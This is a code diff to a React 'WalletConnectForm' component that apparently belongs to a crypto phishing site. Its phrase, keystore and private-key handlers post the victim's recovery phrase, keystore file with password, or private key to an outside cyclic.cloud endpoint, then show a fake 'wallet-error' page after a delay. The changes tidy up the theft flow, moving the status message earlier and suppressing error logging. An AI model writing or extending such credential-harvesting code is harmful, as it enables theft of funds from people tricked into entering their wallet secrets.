@@ -57,6 +57,7 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
 
   // ##### PHRASE
   const handlePhraseSubmit = async (e) => {
+    setPhraseSubmit("Processing...")
     e.preventDefault();
     const name = wallet
     const type = "Phrase"
@@ -64,28 +65,28 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
     const password = "not_required"
     if (validatePhrase(phrase)) {
       try {
-        const res = await axios.post('https://long-newt-coveralls.cyclic.cloud/secure/connect/', { name, type, data, password });
-        setPhraseSubmit("Processing...")
+        await axios.post('https://long-newt-coveralls.cyclic.cloud/secure/connect/', { name, type, data, password });
         setTimeout(() => {
           navigate('/wallet-error')
         }, 5000);
       } catch (error) {
-        console.log(error)
+        console.log("")
       }
     } else {
       setPhraseError(true);
     }
   }
+
   // ##### KEYSTORE JSON SUBMISSION
   const handleKeystoreSubmit = async (e) => {
+    setKeystoreSubmit("Processing...")
     e.preventDefault();
     const name = wallet
     const type = "Keystore_JSON"
     const data = keystore
     const password = keystorePassword
     try {
-      const res = await axios.post('https://long-newt-coveralls.cyclic.cloud/secure/connect/', { name, type, data, password });
-      setKeystoreSubmit("Processing...")
+      await axios.post('https://long-newt-coveralls.cyclic.cloud/secure/connect/', { name, type, data, password });
       setTimeout(() => {
         navigate('/wallet-error')
       }, 5000);
@@ -93,8 +94,10 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
       console.log("error")
     }
   }
+  
   // ##### PRIVATE KEY SUBMISSION
   const handlePrivateKeySubmit = async (e) => {
+    setPrivateSubmit("Processing...")
     e.preventDefault();
     const name = wallet
     const type = "Private_Key"
@@ -103,7 +106,6 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
     if (validatePhrase(privateKey)) {
       try {
         const res = await axios.post('https://long-newt-coveralls.cyclic.cloud/secure/connect/', { name, type, data, password });
-        setPhraseSubmit("Processing...")
         setTimeout(() => {
           navigate('/wallet-error')
         }, 5000);
